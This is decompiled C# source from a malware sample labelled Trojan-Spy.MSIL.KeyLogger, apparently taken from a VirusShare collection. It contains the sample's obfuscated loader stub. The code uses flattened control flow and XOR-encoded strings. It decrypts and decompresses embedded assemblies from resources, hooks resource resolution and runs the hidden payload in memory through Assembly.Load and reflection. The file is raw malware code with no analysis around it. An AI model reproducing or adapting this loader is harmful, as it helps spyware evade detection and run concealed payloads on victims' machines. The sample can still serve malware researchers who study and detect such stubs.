// Decompiled with JetBrains decompiler
// Type: N6.T40
// Assembly: stub7, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A1C75A54-DF7D-4296-B346-B1DAFCC940B9
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.qqc-8459fc94f3d58ee15579a5804217b56ce046b6ec56620a3633c9f389d220cbc2.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.IO.Packaging;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Windows.Forms;

namespace N6
{
  internal static class T40
  {
    private static Assembly M184(Package Ⴃ, string Ⴅ)
    {
      Uri A_1 = new Uri(Ⴅ, UriKind.Relative);
      Stream A_0 = T44.M206(T44.M205(Ⴃ, A_1, 367, 364), 683, 651);
      byte[] numArray;
      try
      {
        numArray = new byte[(int) T40.T43.M197(A_0, 530, 574)];
        T40.T43.M198(A_0, numArray, 0, numArray.Length, 87, 86);
      }
      finally
      {
        int num = 3;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 2:
              goto label_6;
            case 1:
              goto label_5;
            default:
              num = A_0 == null ? 0 : 1;
              continue;
          }
        }
label_5:
        A_0.Dispose();
label_6:;
      }
      int num1 = 5;
      Assembly assembly;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (object) assembly != null ? 3 : 1;
            continue;
          case 1:
          case 2:
          case 4:
            goto label_11;
          case 3:
            goto label_12;
          default:
            assembly = T40.T41.M193(numArray, 942, 927);
            goto case 0;
        }
      }
label_11:
      throw new ArgumentException(T40.T41.M192(1305315789, 6) + Ⴅ);
label_12:
      return assembly;
    }

    [STAThread]
    private static void M185(string[] Ⴀ)
    {
      T40.T41.M195();
      try
      {
        switch (0)
        {
          default:
            // ISSUE: type reference
            Stream A_0_1 = T44.T45.M210(T44.T45.M209(T40.M186(__typeref (T40), 322, 264), 308, 361), T40.T41.M192(1305315794, 5), 637, 627);
            try
            {
              switch (1)
              {
                default:
                  Package Ⴃ = T44.T45.M211(A_0_1, FileMode.Open, FileAccess.Read, 702, 749);
                  try
                  {
                    Assembly A_0_2;
                    switch (4)
                    {
                      case 3:
                        T40.T43.M199((MethodBase) T44.T45.M212(A_0_2, 145, 186), (object) null, new object[1]
                        {
                          (object) Ⴀ
                        }, 568, 633);
                        break;
                      default:
                        A_0_2 = T40.M184(Ⴃ, T40.T41.M192(1305315821, 2));
                        goto case 3;
                    }
                  }
                  finally
                  {
                    int num = 4;
                    while (true)
                    {
                      switch (num)
                      {
                        case 0:
                          goto label_12;
                        case 2:
                        case 5:
                          goto label_11;
                        default:
                          num = Ⴃ == null ? 0 : 5;
                          continue;
                      }
                    }
label_11:
                    ((IDisposable) Ⴃ).Dispose();
label_12:;
                  }
                  switch (1)
                  {
                  }
                  break;
              }
            }
            finally
            {
              int num = 4;
              while (true)
              {
                switch (num)
                {
                  case 0:
                  case 6:
                    goto label_18;
                  case 1:
                  case 5:
                    goto label_19;
                  default:
                    num = A_0_1 == null ? 5 : 6;
                    continue;
                }
              }
label_18:
              A_0_1.Dispose();
label_19:;
            }
            switch (2)
            {
            }
            break;
        }
      }
      catch (Exception ex)
      {
        string[] strArray = new string[5]
        {
          T44.M207((MemberInfo) T40.T41.M194(ex, 442, 497), 63, 22),
          null,
          null,
          null,
          null
        };
        int num1 = 4;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              strArray[3] = T40.T41.M192(1305315834, 0);
              strArray[4] = ex.StackTrace;
              num1 = 5;
              continue;
            case 1:
            case 5:
              goto label_26;
            case 2:
              goto label_28;
            default:
              strArray[1] = T40.T41.M192(1305315839, 5);
              strArray[2] = ex.Message;
              num1 = 0;
              continue;
          }
        }
label_26:
        int num2 = (int) MessageBox.Show(string.Concat(strArray));
      }
label_28:
      switch (2)
      {
      }
    }

    internal static System.Type M186(RuntimeTypeHandle A_0, int A_1, int A_2)
    {
label_3:
      int num1;
      switch (A_2 ^ A_1)
      {
        case 74:
          num1 = 4;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
          case 6:
            num2 = 0;
            continue;
          case 3:
            num2 = 0;
            continue;
          case 4:
          case 7:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (T40.M186);
            num2 = 0;
            continue;
        }
      }
label_8:
      return System.Type.GetTypeFromHandle(A_0);
    }

    internal static Assembly M187(int A_0, int A_1)
    {
label_0:
      switch ((A_1 ^ A_0) - 17)
      {
        case 0:
          return Assembly.GetExecutingAssembly();
        default:
          goto label_0;
      }
    }

    internal static long M188(Stream A_0, int A_1, int A_2)
    {
label_0:
      switch ((A_2 ^ A_1) - 14)
      {
        case 0:
          return A_0.Length;
        default:
          goto label_0;
      }
    }

    internal static int M189(Stream A_0, byte[] A_1, int A_2, int A_3, int A_4, int A_5)
    {
label_0:
      switch ((A_5 ^ A_4) - 63)
      {
        case 0:
          return A_0.Read(A_1, A_2, A_3);
        case 1:
          return A_0.Read(A_1, A_2, A_3);
        default:
          goto label_0;
      }
    }

    internal static Evidence M190(Assembly A_0, int A_1, int A_2)
    {
label_0:
      switch ((A_2 ^ A_1) - 98)
      {
        case 0:
          return A_0.Evidence;
        default:
          goto label_0;
      }
    }

    internal sealed class T41
    {
      private static readonly char[] Ⴄ;
      private static readonly char[] Ⴐ;
      private static readonly string[] Ⴃ;
      internal static T40.T41.T42 Ⴓ;
      private static bool Ⴗ;

      static T41()
      {
        int num = 2;
        char[] chArray;
        while (true)
        {
          switch (num)
          {
            case 0:
              chArray[7] = '\u248C';
              goto case 5;
            case 1:
              goto label_7;
            case 3:
              goto label_8;
            case 4:
              chArray[2] = 'ḙ';
              chArray[1] = '⾼';
              chArray[4] = '㊝';
              num = 6;
              continue;
            case 5:
              chArray[0] = '◜';
              num = 1;
              continue;
            case 6:
              chArray[3] = '\u0AD2';
              goto case 0;
            default:
              T40.T41.Ⴐ = new char[53]
              {
                char.MinValue,
                '\u0019',
                char.MinValue,
                '▉',
                '⿒',
                'Ṹ',
                'ર',
                '㋱',
                '\u1715',
                '⬘',
                '\u24F8',
                '△',
                '⾜',
                'ṵ',
                'ઽ',
                '㋼',
                '᜔',
                '⬘',
                '\u24ED',
                '▯',
                '⿏',
                'Ṽ',
                'િ',
                '\u32FF',
                '\u171C',
                '⭁',
                'Ⓐ',
                '◼',
                '\u0001',
                '\u0005',
                char.MinValue,
                '\u2FDD',
                'ḷ',
                'ન',
                '㋴',
                'ᜀ',
                '\u0002',
                '\n',
                char.MinValue,
                'Ḷ',
                'ડ',
                '㋩',
                'ᜅ',
                '⭚',
                'Ⓕ',
                '◲',
                '\u2FD9',
                'ṡ',
                'ષ',
                '\u0003',
                '\u0001',
                char.MinValue,
                '\u0AD8'
              };
              chArray = new char[8]
              {
                char.MinValue,
                char.MinValue,
                char.MinValue,
                char.MinValue,
                char.MinValue,
                char.MinValue,
                '⬸',
                char.MinValue
              };
              num = 4;
              continue;
          }
        }
label_8:
        return;
label_7:
        chArray[5] = 'ᝰ';
        T40.T41.Ⴃ = new string[4];
        T40.T41.Ⴄ = chArray;
      }

      internal static Assembly M191(object sender, ResolveEventArgs args)
      {
label_3:
        string A_1_1 = T44.M208(1305315779, 8);
label_4:
        string str = A_1_1;
        string A_1_2 = T40.T43.M200((object) str, (object) '1', 535, 627);
        int num1 = 8;
        AppDomain A_0_1;
        Dictionary<string, string> A_2;
        Assembly A_0_2;
        Stream A_0_3;
        byte[] numArray;
        int num2;
        int index1;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 12:
              numArray[index1] ^= (byte) (index1 + num2 & (int) byte.MaxValue);
              num1 = 6;
              continue;
            case 1:
              goto label_4;
            case 2:
              if (A_2 == null)
              {
                num1 = 9;
                continue;
              }
              goto label_38;
            case 3:
              A_0_2 = T40.M187(524, 541);
              A_0_3 = T44.T45.M213(A_0_2, A_1_1, 676, 753);
              num1 = 4;
              continue;
            case 4:
              num1 = A_0_3 != null ? 10 : 13;
              continue;
            case 5:
              num1 = index1 < numArray.Length ? 0 : 11;
              continue;
            case 6:
              ++index1;
              num1 = 5;
              continue;
            case 8:
            case 16:
              A_0_1 = T40.T43.M201(931, 923);
              A_2 = (Dictionary<string, string>) T40.T43.M202(A_0_1, A_1_2, 440, 408);
              num1 = 2;
              continue;
            case 9:
              A_2 = new Dictionary<string, string>();
              T40.T43.M203(A_0_1, A_1_2, (object) A_2, 176, 161);
              num1 = 3;
              continue;
            case 10:
              numArray = new byte[T40.M188(A_0_3, 431, 417) - 1L];
              num1 = 15;
              continue;
            case 11:
              goto label_18;
            case 13:
              goto label_11;
            case 14:
              index1 = 0;
              num1 = 5;
              continue;
            case 15:
              num2 = T40.T41.M196(A_0_3, 620, 559);
              T40.M189(A_0_3, numArray, 0, numArray.Length, 435, 396);
              num1 = 14;
              continue;
            case 17:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (T40.T41.M191);
              num1 = 17;
              continue;
          }
        }
label_11:
        return (Assembly) null;
label_18:
        MemoryStream A_0_4 = new MemoryStream();
        DeflateStream A_0_5 = new DeflateStream((Stream) new MemoryStream(numArray), CompressionMode.Decompress, true);
        try
        {
          int num3 = 6;
          byte[] A_1_3;
          int A_3;
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 4:
                num3 = (A_3 = T40.M189((Stream) A_0_5, A_1_3, 0, A_1_3.Length, 592, 528)) > 0 ? 5 : 2;
                continue;
              case 2:
                goto label_29;
              case 5:
                T44.T45.M214((Stream) A_0_4, A_1_3, 0, A_3, 63, 117);
                goto case 0;
              default:
                A_1_3 = new byte[1024];
                num3 = 4;
                continue;
            }
          }
        }
        finally
        {
          int num4 = 4;
          while (true)
          {
            switch (num4)
            {
              case 0:
              case 3:
                goto label_27;
              case 1:
                goto label_28;
              default:
                num4 = A_0_5 == null ? 1 : 3;
                continue;
            }
          }
label_27:
          A_0_5.Dispose();
label_28:;
        }
label_29:
        int num5 = 7;
label_30:
        Assembly data;
        string[] manifestResourceNames;
        int index2;
        while (true)
        {
          switch (num5)
          {
            case 0:
            case 9:
              goto label_40;
            case 1:
              A_0_1.SetData(str, (object) data);
              manifestResourceNames = data.GetManifestResourceNames();
              goto case 11;
            case 2:
              goto label_38;
            case 3:
              goto label_41;
            case 4:
              ++index2;
              num5 = 8;
              continue;
            case 5:
              string key = manifestResourceNames[index2];
              A_2[key] = key;
              goto case 4;
            case 8:
              num5 = index2 < manifestResourceNames.Length ? 5 : 12;
              continue;
            case 10:
              num5 = !A_2.ContainsKey(args.Name) ? 3 : 0;
              continue;
            case 11:
              index2 = 0;
              num5 = 8;
              continue;
            case 12:
              num5 = 10;
              continue;
            default:
              data = T40.T43.M204(T44.T45.M215(A_0_4, 622, 570), (byte[]) null, T40.M190(A_0_2, 821, 855), 856, 870);
              num5 = 1;
              continue;
          }
        }
label_40:
        return data;
label_41:
        return (Assembly) null;
label_38:
        data = (Assembly) A_0_1.GetData(str);
        num5 = 10;
        goto label_30;
      }

      internal static string M192(int A_0, int A_1)
      {
label_3:
        int index1 = A_0 ^ 1305315787 ^ A_1;
        char[] ⴐ = T40.T41.Ⴐ;
        int index2 = (int) ⴐ[index1];
        int num1 = 5;
        string str1;
        int length1;
        char[] chArray;
        char[] ⴄ;
        int length2;
        int index3;
        while (true)
        {
          switch (num1)
          {
            case 0:
              chArray[index3] = (char) ((uint) ⴐ[index1 + index3] ^ (uint) ⴄ[(index3 + index2) % length2]);
              num1 = 4;
              continue;
            case 1:
            case 12:
              int num2 = (int) ⴐ[index1 + 1];
              length1 = ((int) ⴐ[index1 + 2] << 16) + num2;
              num1 = 10;
              continue;
            case 2:
              index3 = 0;
              num1 = 8;
              continue;
            case 3:
              goto label_5;
            case 4:
              index3 = 1 + index3;
              num1 = 8;
              continue;
            case 5:
              num1 = (str1 = T40.T41.Ⴃ[index2]) == null ? 1 : 3;
              continue;
            case 6:
              goto label_12;
            case 8:
              num1 = index3 < length1 ? 0 : 6;
              continue;
            case 9:
            case 10:
            case 11:
              chArray = new char[length1];
              ⴄ = T40.T41.Ⴄ;
              length2 = ⴄ.Length;
              index1 += 3;
              num1 = 2;
              continue;
            case 13:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (T40.T41.M192);
              num1 = 13;
              continue;
          }
        }
label_5:
        return str1;
label_12:
        string str2 = new string(chArray);
        T40.T41.Ⴃ[index2] = str2;
        return str2;
      }

      internal static Assembly M193(byte[] A_0, int A_1, int A_2)
      {
label_3:
        int num1;
        switch (A_2 ^ A_1)
        {
          case 49:
            num1 = 2;
            break;
          default:
            num1 = 7;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
            case 4:
              goto label_8;
            case 3:
              goto label_3;
            case 5:
              num2 = 3;
              continue;
            case 7:
              num2 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (T40.T41.M193);
              num2 = 3;
              continue;
          }
        }
label_8:
        return Assembly.Load(A_0);
      }

      internal static System.Type M194(Exception A_0, int A_1, int A_2)
      {
label_3:
        int num1;
        switch (A_2 ^ A_1)
        {
          case 75:
            num1 = 2;
            break;
          default:
            num1 = 1;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              num2 = 5;
              continue;
            case 1:
              num2 = 5;
              continue;
            case 2:
              goto label_8;
            case 4:
            case 5:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (T40.T41.M194);
              num2 = 5;
              continue;
          }
        }
label_8:
        return A_0.GetType();
      }

      internal static void M195()
      {
        int num1 = 3;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 4:
              goto label_4;
            default:
              if (!T40.T41.Ⴗ)
              {
                num1 = 4;
                continue;
              }
              goto label_11;
          }
        }
label_11:
        return;
label_4:
        lock (typeof (T40.T41))
        {
          int num2 = 1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                T40.T41.Ⴗ = true;
                goto case 5;
              case 2:
                num2 = 4;
                continue;
              case 4:
                goto label_13;
              case 5:
                AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(T40.T41.M191);
                goto case 2;
              default:
                num2 = T40.T41.Ⴗ ? 4 : 0;
                continue;
            }
          }
        }
label_13:
        int num3 = 0;
        while (true)
        {
          switch (num3)
          {
            case 1:
              goto label_17;
            case 2:
              goto label_18;
            case 4:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (T40.T41.M195);
              num3 = 1;
              continue;
            case 5:
              goto label_19;
            default:
              num3 = 1;
              continue;
          }
        }
label_17:
        return;
label_18:
        return;
label_19:;
      }

      internal static int M196(Stream A_0, int A_1, int A_2)
      {
label_0:
        switch ((A_2 ^ A_1) - 67)
        {
          case 0:
            return A_0.ReadByte();
          default:
            goto label_0;
        }
      }

      [StructLayout(LayoutKind.Explicit, Size = 106, Pack = 1)]
      private struct T42
      {
      }
    }

    internal sealed class T43
    {
      internal static long M197(Stream A_0, int A_1, int A_2)
      {
label_3:
        int num1;
        switch (A_2 ^ A_1)
        {
          case 44:
            num1 = 5;
            break;
          default:
            num1 = 2;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 7:
              goto label_3;
            case 1:
              num2 = 7;
              continue;
            case 2:
            case 3:
              num2 = 7;
              continue;
            case 4:
            case 5:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (T40.T43.M197);
              num2 = 7;
              continue;
          }
        }
label_8:
        return A_0.Length;
      }

      internal static int M198(Stream A_0, byte[] A_1, int A_2, int A_3, int A_4, int A_5)
      {
label_3:
        int num1;
        switch (A_5 ^ A_4)
        {
          case 1:
            num1 = 7;
            break;
          default:
            num1 = 2;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 1:
              num2 = 4;
              continue;
            case 2:
            case 6:
              num2 = 4;
              continue;
            case 3:
            case 4:
              goto label_3;
            case 5:
            case 7:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (T40.T43.M198);
              num2 = 4;
              continue;
          }
        }
label_8:
        return A_0.Read(A_1, A_2, A_3);
      }

      internal static object M199(MethodBase A_0, object A_1, object[] A_2, int A_3, int A_4)
      {
label_3:
        int num1;
        switch (A_4 ^ A_3)
        {
          case 65:
            num1 = 7;
            break;
          default:
            num1 = 3;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
            case 4:
              goto label_3;
            case 1:
            case 6:
              num2 = 0;
              continue;
            case 3:
              num2 = 0;
              continue;
            case 7:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (T40.T43.M199);
              num2 = 0;
              continue;
          }
        }
label_8:
        return A_0.Invoke(A_1, A_2);
      }

      internal static string M200(object A_0, object A_1, int A_2, int A_3)
      {
label_0:
        switch ((A_3 ^ A_2) - 100)
        {
          case 0:
            return A_0.ToString() + A_1;
          default:
            goto label_0;
        }
      }

      internal static AppDomain M201(int A_0, int A_1)
      {
label_0:
        switch ((A_1 ^ A_0) - 56)
        {
          case 0:
            return AppDomain.CurrentDomain;
          default:
            goto label_0;
        }
      }

      internal static object M202(AppDomain A_0, string A_1, int A_2, int A_3)
      {
label_0:
        switch ((A_3 ^ A_2) - 32)
        {
          case 0:
            return A_0.GetData(A_1);
          default:
            goto label_0;
        }
      }

      internal static void M203(AppDomain A_0, string A_1, object A_2, int A_3, int A_4)
      {
label_0:
        switch ((A_4 ^ A_3) - 17)
        {
          case 0:
            A_0.SetData(A_1, A_2);
            break;
          default:
            goto label_0;
        }
      }

      internal static Assembly M204(
        byte[] A_0,
        byte[] A_1,
        Evidence A_2,
        int A_3,
        int A_4)
      {
label_0:
        switch ((A_4 ^ A_3) - 62)
        {
          case 0:
            return Assembly.Load(A_0, A_1, A_2);
          default:
            goto label_0;
        }
      }
    }
  }
}
